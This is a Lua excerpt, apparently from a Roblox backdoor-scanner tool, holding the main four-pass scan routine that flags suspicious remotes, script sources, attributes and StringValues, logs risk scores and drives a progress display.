-- §18  MAIN SCANNER LOGIC  (4-pass deep scan)
-- ═══════════════════════════════════════════════════════════════════════

local stopScan = false

local function runDeepScan()
    if S.isScanning then return end
    S.isScanning = true; stopScan = false
    S.remotes={}; S.scripts={}; S.attrFinds={}; S.strvalFinds={}
    ResultsList:ClearAllChildren(); mkList(ResultsList, 3)
    bScan.Text = "⏳ Scanning…"; bScan.BackgroundColor3 = T.ACC2

    local t0 = os.clock()
    log("INFO", ("Deep Scan v%s — %d services · %d keywords · %d patterns · %d sigs"):format(
        CFG.VERSION, #CFG.SERVICES, #CFG.BAD_NAMES, #CFG.SRC_PATTERNS, #CFG.SIGNATURES))

    for idx, svcName in ipairs(CFG.SERVICES) do
        if stopScan then break end
        task.wait()
        local ok, svc = pcall(function() return game:GetService(svcName) end)
        if not ok then
            log("WARN","Cannot access: "..svcName)
        else
            local prog = idx / #CFG.SERVICES
            TweenService:Create(ProgressFill, TweenInfo.new(0.18), {Size=UDim2.new(prog,0,1,0)}):Play()
            ProgressLabel.Text = "[1-4] Scanning "..svcName.."…"

            for _, inst in ipairs(recurse(svc)) do
                if stopScan then break end

                -- Pass 1: Remote name heuristics
                if inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction") then
                    local bad, kw = isBadName(inst.Name)
                    local entry = {
                        inst=inst, svc=svcName, path=inst:GetFullName(),
                        class=inst.ClassName, keyword=kw, fuzzRisk=0
                    }
                    entry.risk = calcRemoteRisk(entry)
                    S.remotes[#S.remotes+1] = entry
                    if bad or CFG.VERBOSE then addRemoteRow(entry) end
                    if bad then
                        log("CRIT", ("Risk %d  %s '%s' (kw:'%s') @ %s"):format(
                            entry.risk, inst.ClassName, inst.Name, kw or "?", entry.path))
                    end
                    if bad and CFG.FIREWALL_MODE then firewallRemote(entry) end
                end

                -- Pass 2: Script source deep analysis
                if CFG.SCAN_SCRIPTS and (inst:IsA("Script") or inst:IsA("LocalScript") or inst:IsA("ModuleScript")) then
                    local flags, sigs = deepScanSource(inst)
                    if #flags > 0 or #sigs > 0 then
                        local risk = calcScriptRisk(flags, sigs)
                        local e = {inst=inst, path=inst:GetFullName(), flags=flags, sigs=sigs, risk=risk}
                        S.scripts[#S.scripts+1] = e
                        addScriptRow(e)
                        local level = #sigs>0 and "CRIT" or "WARN"
                        log(level, ("Risk %d  Script '%s' — %d flags, %d sigs @ %s"):format(
                            risk, inst.Name, #flags, #sigs, inst:GetFullName()))
                    end
                end

                -- Pass 3: Attribute scanning
                if CFG.SCAN_ATTRS then
                    local aFinds = scanAttributes(inst)
                    if #aFinds > 0 then
                        S.attrFinds[#S.attrFinds+1] = {inst=inst, findings=aFinds}
                        addAttrRow(inst, aFinds)
                        for _, f in ipairs(aFinds) do
                            log("WARN","[ATTR] "..inst:GetFullName().." — "..f)
                        end
                    end
                end

                -- Pass 4: StringValue scanning
                if CFG.SCAN_STRVALS and inst:IsA("StringValue") then
                    local svF = scanStrVal(inst)
                    if #svF > 0 then
                        S.strvalFinds[#S.strvalFinds+1] = {inst=inst, findings=svF}
                        for _, f in ipairs(svF) do
                            log("WARN","[STRVAL] "..inst:GetFullName().." — "..f)
                        end
                    end
                end

            end -- inst loop
        end
    end -- service loop

    local elapsed = os.clock() - t0
    local susp = 0
    for _, r in ipairs(S.remotes) do if r.risk >= 50 then susp += 1 end end
    statLabels["time"].Text = ("%.1fs"):format(elapsed)
    updateStats()
    ProgressLabel.Text = ("Done %.1fs — %d remotes (%d high-risk) · %d scripts · %d attrs"):format(
        elapsed, #S.remotes, susp, #S.scripts, #S.attrFinds)
    TweenService:Create(ProgressFill, TweenInfo.new(0.3), {Size=UDim2.new(1,0,1,0)}):Play()
    task.delay(2, function()
        TweenService:Create(ProgressFill, TweenInfo.new(0.5), {Size=UDim2.new(0,0,1,0)}):Play()
    end)
    log("OK", ("Scan complete %.1fs — %d remotes (%d risk≥50) · %d scripts · %d attrs"):format(
        elapsed, #S.remotes, susp, #S.scripts, #S.attrFinds))

    bScan.Text = "⚡  Deep Scan"
    bScan.BackgroundColor3 = T.BBLU
    S.isScanning = false
end

